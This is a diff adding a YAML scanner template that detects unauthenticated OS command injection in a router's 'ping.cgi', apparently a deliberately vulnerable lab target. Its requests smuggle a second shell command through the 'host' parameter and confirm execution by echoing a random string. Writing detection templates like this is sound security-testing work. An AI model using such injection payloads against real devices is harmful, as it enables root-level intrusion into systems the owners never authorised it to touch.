@@ -1,0 +1,37 @@
+id: malgorouter-ping-cmdi
+
+info:
+  name: MalgoRouter ping.cgi - Unauthenticated OS Command Injection
+  author: opencode
+  severity: critical
+  description: |
+    /cgi-bin/ping.cgi builds a shell command with the attacker-controlled
+    "host" parameter and passes it to system(), yielding root command
+    execution. The command's output is redirected into /tmp/ping.txt and
+    returned to the caller. Low difficulty tier applies no filtering.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17621
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6277
+  classification:
+    cwe-id: CWE-78
+  metadata:
+    max-request: 2
+    product: malgorouter
+    vendor: glinet
+  tags: malgorouter,rce,cmdi,cwe-78
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/ping.cgi?host=127.0.0.1%3becho%20{{randstr}}"
+      - "{{BaseURL}}/cgi-bin/ping.cgi?host=127.0.0.1;echo%20{{randstr}}"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{randstr}}"
+      - type: status
+        status:
+          - 200
